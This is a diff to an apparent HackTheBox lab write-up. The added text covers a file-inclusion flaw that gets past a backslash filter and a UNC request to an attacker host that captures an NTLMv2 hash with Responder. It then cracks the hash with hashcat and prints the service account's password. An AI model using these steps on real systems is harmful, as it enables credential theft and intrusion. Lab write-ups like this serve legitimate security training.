@@ -263,6 +263,8 @@ BOOM! We get my Nmap scans that are in my /HTB/Escape directory for this challen
 
 This means that we can exploit this!
 
+Unfortunately, it was not that simple. There was still some sort of sanitization going on in the background and I could not get the server to execute malicious code included on my server.
+
 ### Port 445 - SMB
 
 #### Enum4Linux
@@ -290,9 +292,45 @@ crackmapexec smb 10.129.95.32 -u '' -p ''
 
 ## Exploitation
 
-### Name of the technique
+### Capturing NTLMv2 Hash via SMB -> RFI
 
-This is the exploit
+The sanitization was blocking backslashes, but forward slashes were still working properly!
+
+Let's see if we can grab a hash with `Responder`!
+
+Start Responder:
+
+```
+sudo responder -I tu
+```
+
+Capture NTLMv2 Hash:
+
+```
+php?view=//10.10.14.38/gethackedlol
+```
+
+<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:yellow;">We captured the NTLMv2 hash of svc\_apache!</mark>
+
+hash.txt:
+
+```
+svc_apache::flight:77d44c984d50933f:38B9B97BAA56344A27BD56E7F6A6CBD8:010100000000000080CE1EE4FB7CD9019DD59F308E7C51610000000002000800360047005700510001001E00570049004E002D0058004B004E005900370047003800510056004200350004003400570049004E002D0058004B004E00590037004700380051005600420035002E0036004700570051002E004C004F00430041004C000300140036004700570051002E004C004F00430041004C000500140036004700570051002E004C004F00430041004C000700080080CE1EE4FB7CD90106000400020000000800300030000000000000000000000000300000B3634D5BADB59F9A713D6D04000C215340F2E8849E20E1F44BD57D24C7420FDB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330038000000000000000000
+```
+
+Time to crack this hash!
+
+```
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt -O
+```
+
+Password:
+
+```
+svc_apache:S@Ss!K@*t13
+```
 
 ## Privilege Escalation
 
